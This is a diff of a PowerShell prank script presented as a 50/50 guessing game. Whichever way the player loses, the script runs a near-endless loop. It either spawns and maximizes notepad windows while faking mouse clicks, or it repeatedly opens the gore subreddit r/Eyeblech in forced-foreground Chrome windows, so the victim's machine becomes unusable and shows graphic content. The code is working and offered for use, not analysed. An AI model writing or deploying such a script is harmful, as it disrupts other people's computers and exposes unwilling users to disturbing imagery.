@@ -1,9 +1,8 @@
 # Made by https://github.com/SuitableEmu/
 param($minutes = 9999999)
-$Random = Get-Random -Maximum 2
+$r = Get-Random -Maximum 2
 Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;
 $wsh = New-Object -ComObject Wscript.Shell
-$p = 1
 function Set-WindowStyle {
 param(
     [Parameter()]
@@ -33,7 +32,7 @@ param(
     $Win32ShowWindowAsync::ShowWindowAsync($MainWindowHandle, $WindowStates[$Style]) | Out-Null
 }
 function Win-Tune {
-do {Write-Host $p; $p++
+
     [console]::beep(659,250) 
     [console]::beep(659,250) 
     [console]::beep(659,300) 
@@ -59,22 +58,40 @@ do {Write-Host $p; $p++
     [console]::beep(587,225) 
     [console]::beep(494,225)
 
+
 }
 
-until ($p -gt 1)
+
+do {
+  write-host -nonewline "50/50 chance win or lose enter 0 or 1: "
+  $inputString = read-host
+  $Value = $inputString -as [Double]
+  $ok = $value -ne $NULL
+  if ( -not $ok ) {
+          Write-Host "Cheater"
+        for ($i = 0; $i -lt $minutes; $i++){
+        Start-Process www.reddit.com/r/Eyeblech
+        (Get-Process -Name chrome).MainWindowHandle | foreach { Set-WindowStyle MAXIMIZE $_ }
+        (New-Object -ComObject WScript.Shell).AppActivate((get-process chrome).MainWindowTitle) }
+}
+ <#elseif ($ok -notmatch 1 -or 0 ) {
+ Write-Host "Cheater"
+    }
+    #>
+
+}until ( $ok )
+
+
+do {
+
+if($Value -eq $r) {
+        Write-Host "You Win!"
+        Win-Tune
 }
 
-do{
-    $answer = Read-Host "50/50 chance win or lose enter 0 or 1" 
-
-    Write-Host "You entered $answer"
-
-    $loopCount++
-    
-    if($answer -eq $Random){
-        $answered = $true
+else {
         Write-Host "You Lost"
-        Start-Sleep 3
+        #Start-Sleep 3
  for ($i = 0; $i -lt $minutes; $i++) {
     [W.U32]::mouse_event(6,0,0,0,0)
     Start-Process notepad.exe
@@ -82,23 +99,6 @@ do{
     (Get-Process -Name notepad).MainWindowHandle | foreach { Set-WindowStyle MAXIMIZE $_ }
     (New-Object -ComObject WScript.Shell).AppActivate((get-process notepad).MainWindowTitle)
 }
-    }
-    elseif($answer -notmatch $Random) {
-        Write-Host "You Win"
-        Win-Tune
-    }
 
-    Else {
-        Write-Host "Cheater"
-        for ($i = 0; $i -lt $minutes; $i++){
-        Start-Process www.reddit.com/r/Eyeblech
-        (Get-Process -Name chrome).MainWindowHandle | foreach { Set-WindowStyle MAXIMIZE $_ }
-        (New-Object -ComObject WScript.Shell).AppActivate((get-process chrome).MainWindowTitle)
 }
-}
-
-
-} until ($answered -eq $Random)
-
-
-#Write-Host ("Looped {0} times" -f $loopCount)
+}until ($ok)
